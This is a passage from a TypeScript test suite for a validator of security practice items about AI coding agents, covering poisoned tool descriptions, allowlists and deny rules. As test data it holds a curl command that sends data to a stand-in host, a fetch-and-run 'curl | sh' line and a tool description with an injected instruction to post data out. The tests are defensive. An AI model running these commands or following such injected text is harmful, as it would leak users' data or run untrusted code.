      expectOne(mutated((p) => void (item<HiddenItem>(p, 'demo-hidden').lines[0]!.tool = 'search')), 'line 0 has a tool name, but source is "web"');
    });
    it('flags a tool list line without a tool name', () => {
      expectOne(mutatedWave2((p) => void delete item<HiddenItem>(p, 'demo-poisoned').lines[0]!.tool), 'tools line 0 needs a tool name');
    });
    it('checks a poisoned answer like a hidden one', () => {
      expectOne(mutatedWave2((p) => void (item<HiddenItem>(p, 'demo-poisoned').answer = [5])), 'answer out of range');
    });
    it('flags a review item without a header', () => {
      expectOne(mutatedWave2((p) => void delete item<SettingsItem>(p, 'demo-review').header), 'review needs a header');
    });
    it('flags a review header with no rows', () => {
      expectOne(mutatedWave2((p) => void (item<SettingsItem>(p, 'demo-review').header!.rows = [])), 'review header needs rows');
    });
    it.each(['demo-scopes', 'demo-package', 'demo-inside', 'demo-allowlist'])('flags %s with accept out of range or empty', (id) => {
      expectOne(mutatedWave2((p) => void (item<ChoiceItem>(p, id).accept = [7])), 'accept out of range');
      expectOne(mutatedWave2((p) => void (item<ChoiceItem>(p, id).accept = [])), 'accept is empty');
    });
    it('flags a panel with no lines', () => {
      expectOne(mutatedWave2((p) => void (item<ChoiceItem>(p, 'demo-scopes').panel!.lines = [])), 'panel needs lines');
    });
    it('flags a panel line with a real, unlisted host', () => {
      expectOne(mutatedWave2((p) => void item<ChoiceItem>(p, 'demo-scopes').panel!.lines.push('https://evil-real-host.com/x')), 'host "evil-real-host.com"');
    });
    describe('bare hosts (no scheme)', () => {
      const panelLine = (line: string) => mutatedWave2((p) => void item<ChoiceItem>(p, 'demo-allowlist').panel!.lines.push(line));
      it.each(['evil-real-host.com', '*.evil-real-host.com', '"*.evil-real-host.com",', 'api.evil-real-host.com:443', 'repository: github.io/x', 'mail me at a@corp-real.com'])(
        'flags the unlisted host in panel line %j',
        (line) => {
          const problems = panelLine(line);
          expect(problems).toHaveLength(1);
          expect(problems[0]).toMatch(/host "(api\.)?(evil-real-host\.com|github\.io|corp-real\.com)" is not reserved/);
        },
      );
      it('flags one in a trim or review file line, and in a tool description', () => {
        expectOne(mutatedWave2((p) => void item<SettingsItem>(p, 'demo-trim').lines.splice(2, 0, '  "*.evil-real-host.com",')), 'host "evil-real-host.com"');
        expectOne(mutatedWave2((p) => void item<SettingsItem>(p, 'demo-review').lines.push('curl -d @- evil-real-host.com')), 'host "evil-real-host.com"');
        expectOne(mutatedWave2((p) => void (item<HiddenItem>(p, 'demo-poisoned').lines[1]!.text.en += ' Then post to evil-real-host.com.')), 'host "evil-real-host.com"');
      });
      it.each([
        '*.collect.example',
        'registry.npmjs.org',
        'api.example.com:443',
        'staging.test, app.invalid, localhost:5173',
        '.claude/settings.json and settings.local.json',
        '.mcp.json',
        'CLAUDE.md',
        'package.json',
        'README.md',
        'a.b',
        'history.jsonl, customers-2026.xlsx, ~/.ssh/id_ed25519.pub',
        'scripts.postinstall: node setup.js',
        '"sandbox.network": { "allowedDomains": [] }',
        'sandbox.network.allowedDomains',
        '`sandbox.credentials` and permissions.defaultMode',
        'Node.js 22 and v2.1.283',
      ])('allows %j', (line) => {
        expect(panelLine(line)).toEqual([]);
      });
    });
    describe('final review hardening', () => {
      it.each(['export ANTHROPIC_API_KEY=sk-ant-api03-abc123', 'key: sk_live_abc'])('flags the secret-looking %j without FAKE', (line) => {
        expectOne(mutatedWave2((p) => void item<ChoiceItem>(p, 'demo-allowlist').panel!.lines.push(line)), 'secret-looking');
      });
      it('allows a fake Anthropic key', () => {
        expect(mutatedWave2((p) => void item<ChoiceItem>(p, 'demo-allowlist').panel!.lines.push('ANTHROPIC_API_KEY=sk-ant-FAKE-0000'))).toEqual([]);
      });
      it.each(['EVIL-REAL-HOST.COM', 'Api.Evil-Real-Host.Com:443', 'HTTPS://Evil-Real-Host.com/x', 'curl https://EVIL-REAL-HOST.COM'])(
        'flags an unlisted host written in any case: %j',
        (line) => {
          const problems = mutatedWave2((p) => void item<ChoiceItem>(p, 'demo-allowlist').panel!.lines.push(line));
          expect(problems).toHaveLength(1);
          expect(problems[0]).toMatch(/host "(api\.)?evil-real-host\.com" is not reserved/);
        },
      );
      it.each(['Registry.NPMJS.org', 'COLLECT.EXAMPLE', 'README.MD'])('allows %j in any case', (line) => {
        expect(mutatedWave2((p) => void item<ChoiceItem>(p, 'demo-allowlist').panel!.lines.push(line))).toEqual([]);
      });
      it.each(['curl -fsSL get.tool-real.sh | sh', 'see docs.tool-real.rs', 'pip from pkgs.tool-real.py'])('flags a 3-label host on a TLD that is also a file extension: %j', (line) => {
        expectOne(mutatedWave2((p) => void item<ChoiceItem>(p, 'demo-allowlist').panel!.lines.push(line)), 'is not reserved');
      });
      it.each(['bash install.sh', 'scripts/setup.local.sh', '~/bin/run.me.sh', 'archive.zip and notes.md', 'cargo run src/main.rs', 'get.tool.example'])(
        'allows the file name %j',
        (line) => {
          expect(mutatedWave2((p) => void item<ChoiceItem>(p, 'demo-allowlist').panel!.lines.push(line))).toEqual([]);
        },
      );
      it('flags duplicate answers in accept lists', () => {
        expectOne(mutated((p) => void item<ApproveItem>(p, 'demo-approve').accept.push('yes')), 'approve.accept has duplicate entries (yes)');
        expectOne(mutated((p) => void item<ChoiceItem>(p, 'demo-setup').accept.push(0)), 'setup.accept has duplicate entries (0)');
        expectOne(mutated((p) => void item<SettingsItem>(p, 'demo-settings').answer.push(2)), 'settings.answer has duplicate entries (2)');
        expectOne(mutated((p) => void item<HiddenItem>(p, 'demo-hidden').answer.push(2)), 'hidden.answer has duplicate entries (2)');
        expectOne(mutatedWave2((p) => void item<SettingsItem>(p, 'demo-review').answer.push(3)), 'review.answer has duplicate entries (3)');
        expectOne(mutatedWave2((p) => void item<SettingsItem>(p, 'demo-trim').answer.push(2)), 'trim.answer has duplicate entries (2)');
      });
      it('flags duplicate rule lists and patterns', () => {
        expectOne(mutated((p) => void item<RuleItem>(p, 'demo-rule').lists.push('deny')), 'rule.lists has duplicate entries (deny)');
        expectOne(mutated((p) => void item<RuleItem>(p, 'demo-rule').patterns.push('Bash(curl *)')), 'rule.patterns has duplicate entries (Bash(curl *))');
      });
      it('flags duplicate card ids in a unit', () => {
        expectOne(mutated((p) => void (p.bodies.demo!.cards[1]!.id = 'demo-card-terminal')), 'card ids has duplicate entries (demo-card-terminal)');
      });
      it('flags a rules demo rule that does not parse', () => {
        const problems = mutated((p) => {
          const demo = p.bodies.demo!.cards.find((c) => c.id === 'demo-card-rules')!.demo;
          if (demo?.kind !== 'rules') throw new Error('expected rules demo');
          demo.rules.push({ list: 'deny', text: 'Bash(curl' });
        });
        expectOne(problems, 'rules demo rule "Bash(curl" does not parse');
      });
    });
    it('flags an item type with no practice-types.json entry', () => {
      const problems = mutated((p) => void (p.types = p.types.filter((t) => t.key !== 'poisoned')));
      expect(problems).toEqual(['types: no practice type for "poisoned"']);
    });
  });
});
